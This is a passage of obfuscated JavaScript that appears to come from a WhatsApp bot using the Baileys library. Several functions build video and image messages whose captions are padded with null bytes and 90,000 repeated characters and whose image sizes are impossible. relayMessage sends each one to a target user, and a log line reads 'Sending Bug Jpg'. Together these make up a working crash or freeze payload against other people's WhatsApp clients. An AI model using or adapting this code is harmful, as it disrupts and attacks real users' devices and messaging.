RucxtZqcWV9mVl59DDrdS7W+Z297M6bn83Tlm9DU05KbmJ4PaaI9O3DJqiLBF3M2fT5epOdOVbHQHwJr9Dgygb8Ydfjif6Tpb98dR+h9PHC4AZqun49MzbWSr/a3ePlxDjyl/qOrEgRMbEADmJpwK3RABwBM2JsOJXcct+0TKScjExCASZ0tw2AqDX5XFzve3uAZj02HUC8iUZp8C4GHlLYiEMvImTBi3WKBmXAhU9wfdZr+j5M77hqHPw0fo+KhwQYmmQGybMNDgTmY22sDXYzNlfM5dzZmtxqAGHh0zJszbb/dwBEzoOKmDNYBmHKPeYck1LAjg8zHmYcMymapyVZlyKKHrF1mpz5yWNY1nLTaB4EwkAG5q2tR8nw6eAM9+wNGBwWM02oRVomf5OxrDTTa3zAKmfUGeZfrNbqHykYEPBPM0WhwppUxNjDX3+TCQom5iaA8O0yPfE1DXt8NALyk+yxFJJiIQeTClC5pM/lZBfaaqsi2JlyMhoHmdO2tlt6uaFqcDgwFmMAA8MjVx6xhM+J631wBDgyhdxU1Vzp6FQ7sODVRSQe0XcW7RUYxrDTFqfw2mZcfmNY7xDtFTp3UMdhMtBv5GUBwIRGbaIeeTNtmdMx6ds//AHI2KpPM0uHBn14RyDiLmz6ETqOPAmsdMBGwVQERIuKInE1C1TTcbmnpgDNSu02P7gZhzc7S+I7bj8QzGOSZkezUOSwB2mELXAiGK8TKo4MynE4I3CEC5hybD8GOQTzHSuR2n//EACARAAICAgICAwAAAAAAAAAAAAABAhEQICExElEDMGL/2gAIAQIBAT8Ap4W1kZX9C4FNPWbldLCIumLRptqxKxrHxyXQ6HI8nZbItUeR5XJofDRKdvgbfoUn6Y5/liisRJ9F07ZfJZazHsl0xrZdknw8oeyGI//EACARAAIABgMBAQAAAAAAAAAAAAABAhARICExEkFRMED/2gAIAQMBAT8Ax+JqlsKXcmPVzm1ZQi2dM6Fk4HGxIZBspVUOOCi8Gn5OLQtoTE5bc2LckPJD8f/Z",
          streamingSidecar: "4PsGNVYL/bmKyy08TD4HRhVW/0B13syEWleRiLNIS+fPsl4I+Z5KdQ==",
          thumbnailDirectPath: "/v/t62.36147-24/11857855_1866356897224917_5456418343720550181_n.enc?ccb=11-4&oh=01_Q5AaIGWYh_Y1n1Q2SsCfDeAxseMvFXviOu8el3g2MzEHbNmI&oe=67531880&_nc_sid=5e03e0",
          thumbnailSha256: "mKU5Li0YYWvtFT5s6fLFLeqU5hESEVzIYWnNcgenNyY=",
          thumbnailEncSha256: "ydInxyQkYy+CPu6KAmtjLm6z9O06ATgiiAw/zcHQ/Ts="
        }
      }), {
        userJid: _0x29b7ca,
        quoted: _0x18e44c
      });
      await _0x4b53e5.relayMessage(_0x29b7ca, _0x2be60b.message, {
        participant: {
          jid: _0x29b7ca
        },
        messageId: _0x2be60b.key.id
      });
    }
    async function _0x535e5c(_0x482c83, _0x36a674) {
      var _0x4f6375 = generateWAMessageFromContent(_0x482c83, proto.Message.fromObject({
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "o9LrGTJaHdYVWZF2UEN5RRap2JMkamsjYfs3ZPfpB4A=",
          fileLength: "236989",
          seconds: 18,
          mediaKey: "8SePyblqpUmoGyb3BP/5nAd3jydoH9HU8YZVDe/VWlU=",
          caption: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000),
          height: 99999,
          width: 99999,
          fileEncSha256: "ABMHTzddlN1NzTAug/7LXAMrA22yJCdnhQTXoLDXQJ0=",
          directPath: "/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&_nc_hot=1730912455",
          mediaKeyTimestamp: "1730912449",
          jpegThumbnail: "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",
          streamingSidecar: "4PsGNVYL/bmKyy08TD4HRhVW/0B13syEWleRiLNIS+fPsl4I+Z5KdQ==",
          thumbnailDirectPath: "/v/t62.36147-24/11857855_1866356897224917_5456418343720550181_n.enc?ccb=11-4&oh=01_Q5AaIGWYh_Y1n1Q2SsCfDeAxseMvFXviOu8el3g2MzEHbNmI&oe=67531880&_nc_sid=5e03e0",
          thumbnailSha256: "mKU5Li0YYWvtFT5s6fLFLeqU5hESEVzIYWnNcgenNyY=",
          thumbnailEncSha256: "ydInxyQkYy+CPu6KAmtjLm6z9O06ATgiiAw/zcHQ/Ts="
        }
      }), {
        userJid: _0x482c83,
        quoted: _0x36a674
      });
      await _0x4b53e5.relayMessage(_0x482c83, _0x4f6375.message, {
        participant: {
          jid: _0x482c83
        },
        messageId: _0x4f6375.key.id
      });
    }
    async function _0x4fb363(_0x510837, _0x1b2753) {
      var _0x241920 = generateWAMessageFromContent(_0x510837, proto.Message.fromObject({
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/33317047_925609246135295_7697349044351571278_n.enc?ccb=11-4&oh=01_Q5AaIFcysMlkyTkP9-JqfEmeAL5hpnxHS7rMCNdGL06fwLIG&oe=67540086&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000),
          fileSha256: "1DZhdaBhAo3f2HuDq4XhDgxgp24GXhVJ3rJrnTJqk00=",
          fileLength: "85631",
          height: 80000,
          width: 80000,
          mediaKey: "4m0noHF4XWMqfQw+jdP2IxKjmY9BbaCS+fo0inRyX80=",
          fileEncSha256: "hd+s3yufaLrlpxnxvWwCEJRTCpFcbrzu5EEgf+QzFW0=",
          directPath: "/v/t62.7118-24/33317047_925609246135295_7697349044351571278_n.enc?ccb=11-4&oh=01_Q5AaIFcysMlkyTkP9-JqfEmeAL5hpnxHS7rMCNdGL06fwLIG&oe=67540086&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1730971373",
          jpegThumbnail: "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",
          scansSidecar: "Sl6CM3K+yVZIMVPndmuHRGwdunpzPpsNeCSXWMY0a3s5d/Swhvc3rQ==",
          scanLengths: [9877, 27074, 16754, 31926],
          midQualityFileSha256: "vkK/C7Cj6CIkjZWGCg/pZ6x0pyBY0zSqPN7MymCYtOU="
        }
      }), {
        userJid: _0x510837,
        quoted: _0x1b2753
      });
      await _0x4b53e5.relayMessage(_0x510837, _0x241920.message, {
        participant: {
          jid: _0x510837
        },
        messageId: _0x241920.key.id
      });
      console.log(_0x3e6b4d.green("Sending Bug Jpg"));
    }
    async function _0x50f2fe(_0x2f9f51, _0x43f419) {
      var _0x1f7424 = generateWAMessageFromContent(_0x2f9f51, proto.Message.fromObject({
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/33317047_925609246135295_7697349044351571278_n.enc?ccb=11-4&oh=01_Q5AaIFcysMlkyTkP9-JqfEmeAL5hpnxHS7rMCNdGL06fwLIG&oe=67540086&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000),
          fileSha256: "1DZhdaBhAo3f2HuDq4XhDgxgp24GXhVJ3rJrnTJqk00=",
          fileLength: "85631",
          height: 80000,
          width: 80000,
          mediaKey: "4m0noHF4XWMqfQw+jdP2IxKjmY9BbaCS+fo0inRyX80=",
          fileEncSha256: "hd+s3yufaLrlpxnxvWwCEJRTCpFcbrzu5EEgf+QzFW0=",
          directPath: "/v/t62.7118-24/33317047_925609246135295_7697349044351571278_n.enc?ccb=11-4&oh=01_Q5AaIFcysMlkyTkP9-JqfEmeAL5hpnxHS7rMCNdGL06fwLIG&oe=67540086&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1730971373",
          jpegThumbnail: "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